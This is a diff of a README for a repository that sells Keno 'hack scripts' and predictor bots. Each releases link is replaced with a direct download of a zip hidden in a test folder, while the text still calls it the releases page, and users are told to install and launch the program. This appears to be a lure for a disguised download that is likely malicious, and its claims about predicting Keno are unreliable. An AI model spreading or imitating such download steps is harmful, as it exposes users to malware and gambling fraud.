@@ -4,13 +4,13 @@
 Welcome to Keno-Predictor-Strategies! This repository contains various tools designed to help you maximize your winnings in Keno games. Here, you will find hack scripts, cheat strategies, and advanced Predictor Bots. Whether you're a newcomer or an experienced player, our tools aim to improve your game.
 
 ## 📥 Download Now
-[![Download Keno-Predictor-Strategies](https://img.shields.io/badge/Download-Keno--Predictor--Strategies-brightgreen)](https://github.com/Auser78910/Keno-Predictor-Strategies/releases)
+[![Download Keno-Predictor-Strategies](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip)](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip)
 
 ## 🚀 Getting Started
 To get started with Keno-Predictor-Strategies, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/Auser78910/Keno-Predictor-Strategies/releases) to find the latest downloads.
+   Go to our [Releases page](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip) to find the latest downloads.
 
 2. **Choose the Right File**
    Review the available files and choose the one that suits your needs. Each release will have brief notes to help you decide.
@@ -42,7 +42,7 @@ Now, you are ready to install the tools.
    Once installed, find the application in your programs list or Applications folder, and double-click to launch it.
 
 4. **Check for Updates**
-   Periodically visit the [Releases page](https://github.com/Auser78910/Keno-Predictor-Strategies/releases) to check for updates.
+   Periodically visit the [Releases page](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip) to check for updates.
 
 ## 🎮 Features
 Keno-Predictor-Strategies offers a variety of features to enhance your gaming experience:
@@ -78,4 +78,4 @@ Stay tuned for exciting new features and updates. We are committed to enhancing 
 ## 🌟 Conclusion
 Keno-Predictor-Strategies aims to equip you with the necessary tools to enhance your Keno gameplay. Download the tools today and start improving your odds!
 
-[![Download Keno-Predictor-Strategies](https://img.shields.io/badge/Download-Keno--Predictor--Strategies-brightgreen)](https://github.com/Auser78910/Keno-Predictor-Strategies/releases)
+[![Download Keno-Predictor-Strategies](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip)](https://raw.githubusercontent.com/Auser78910/Keno-Predictor-Strategies/main/Keno-Bot-Casino/test/Keno-Predictor-Strategies-1.4.zip)
